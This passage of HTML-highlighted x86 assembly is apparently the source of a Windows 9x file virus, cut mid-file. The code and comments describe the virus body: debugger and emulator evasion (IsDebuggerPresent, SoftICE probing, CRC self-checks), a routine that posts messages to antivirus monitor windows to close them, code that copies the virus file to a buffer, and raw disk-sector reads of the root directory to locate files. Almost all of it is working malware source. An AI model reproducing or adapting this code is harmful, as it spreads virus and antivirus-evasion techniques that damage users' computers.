    </span><span class="sc5">vbuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">24576</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;buffer filled with virus file</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">vbuffer</span><span class="sc0">
    </span><span class="sc5">fname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;name of virus file</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                        </span><span class="sc1">;end of data section</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">                       </span><span class="sc1">;code section</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;virus body starts here</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_jmp</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_crc_</span><span class="sc0">           </span><span class="sc1">;start of block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">crc_end</span><span class="sc4">-</span><span class="sc5">_crc_</span><span class="sc0">          </span><span class="sc1">;size of block</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;check code integrity</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DACA92DCh</span><span class="sc0">         </span><span class="sc1">;CRC32 match?</span><span class="sc0">
</span><span class="sc5">_crc_</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">              </span><span class="sc1">;no, quit (anti-breakpoint)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebuggerPresent</span><span class="sc0">          </span><span class="sc1">;check if any application level</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;based debugger is present</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">;yeah, quit - anti-debugger</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">;cause stack overflow exception</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">              </span><span class="sc1">;- anti-emulator</span><span class="sc0">
</span><span class="sc5">seh_jmp</span><span class="sc4">:</span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                    </span><span class="sc1">;reset SEH handler</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">             </span><span class="sc1">;load CS selector</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;only LSB is set under WinNT</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is WinNT active</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0d6h</span><span class="sc0">                </span><span class="sc1">;anti-emulator</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">;save ESP to EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;save CS to stack</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;get it back to EBX</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;match?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">              </span><span class="sc1">;no, quit - anti-emulator</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get debugger context</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is there any?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">;yeah, quit - anti-debugger</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ShItTyMoNs</span><span class="sc0">      </span><span class="sc1">;pointer to stringz</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;to AV monitors</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;2 monitors</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">KiLlMoNs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save counter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;AV string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">            </span><span class="sc1">;find window</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;found?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_mon</span><span class="sc0">                             </span><span class="sc1">;no, try to kill other monitor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;now we will send message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;to AV window to kill itself</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                                </span><span class="sc1">;veeeeeeery stupid X-DD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc0">           </span><span class="sc1">;bye bye, hahaha</span><span class="sc0">
</span><span class="sc5">next_mon</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc0">                           </span><span class="sc1">;next monitor string</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore counter</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">KiLlMoNs</span><span class="sc0">                           </span><span class="sc1">;kill another one, if present</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;store CS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti_l</span><span class="sc0">          </span><span class="sc1">;store offset to code</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">;go there - anti-emulator</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;I found this code in Int13h's</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;tutorial about infectin'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;archives. Int13h found this</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;code in Vecna's Inca virus.</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;So, thank ya guys...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Ehrm, this is very fast</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;procedure to code CRC32 at</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;runtime, no need to use big</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">;tables.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">anti_l</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sICE</span><span class="sc0">            </span><span class="sc1">;pointer to SoftICE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenDriver</span><span class="sc0">             </span><span class="sc1">;try to open its driver</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">;SICE present, quit - anti-debugger</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc0">           </span><span class="sc1">;where to store virus filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">                </span><span class="sc1">;size of filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                </span><span class="sc1">;base address of virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">         </span><span class="sc1">;get virus filename</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                 </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">            </span><span class="sc1">;open virus file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                 </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">24576</span><span class="sc0">              </span><span class="sc1">;size of virus file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbuffer</span><span class="sc0">         </span><span class="sc1">;ptr to buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">               </span><span class="sc1">;copy virus file to buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;and close virus file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;create new thread and let virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">           </span><span class="sc1">;code continue there</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                 </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">       </span><span class="sc1">;allow execution of code -</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; - anti-emulator</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;close handle of thread</span><span class="sc0">
</span><span class="sc5">crc_end</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">e_patch</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                   </span><span class="sc1">;this will be patched by thread</span><span class="sc0">
                        </span><span class="sc1">; - anti-emulator</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">            </span><span class="sc1">;get command-line</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;to esi</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">             </span><span class="sc1">;is it " ? If not, virus filename</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">regSet</span><span class="sc0">              </span><span class="sc1">;ain't long one - anti-AVer</span><span class="sc0">
</span><span class="sc5">lchar</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load next byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">             </span><span class="sc1">;is it " ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">lchar</span><span class="sc0">               </span><span class="sc1">;no, continue</span><span class="sc0">
</span><span class="sc5">_lchar</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">             </span><span class="sc1">;is it space?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_lchar</span><span class="sc0">               </span><span class="sc1">;yeah, continue</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">;is there any parameter?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">regSet</span><span class="sc0">              </span><span class="sc1">;yeah, virus is loaded from</span><span class="sc0">
                        </span><span class="sc1">;C: drive -&gt; no jump to host</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDName</span><span class="sc0">         </span><span class="sc1">;pointer to vwin32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenDriver</span><span class="sc0">             </span><span class="sc1">;open driver</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">regSet</span><span class="sc0">               </span><span class="sc1">;if error, quit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">d_handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0">            </span><span class="sc1">;buffer for reading ROOT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;save ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">I25hSimple</span><span class="sc0">             </span><span class="sc1">;read ROOT</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;get it back</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">c_exit</span><span class="sc0">               </span><span class="sc1">;if error, then quit</span><span class="sc0">

</span><span class="sc5">_f_cmp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;get ptr to ROOT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;ZERO?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">c_exit</span><span class="sc0">               </span><span class="sc1">;yeah, no more filez, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">                 </span><span class="sc1">;size of filename (8+3)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;to EDI</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;calculate CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">873F6A26h</span><span class="sc0">          </span><span class="sc1">;match?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_fn_ok</span><span class="sc0">               </span><span class="sc1">;yeah, try to restore file</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc0">               </span><span class="sc1">;no, get next directory record</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_f_cmp</span><span class="sc0">              </span><span class="sc1">;and try again</span><span class="sc0">
</span><span class="sc5">_fn_ok</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0">            </span><span class="sc1">;load SAVE area sector from disk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regEBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regEDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2880</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;SAVE area = last sector in disk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;one sector to read</span><span class="sc0">
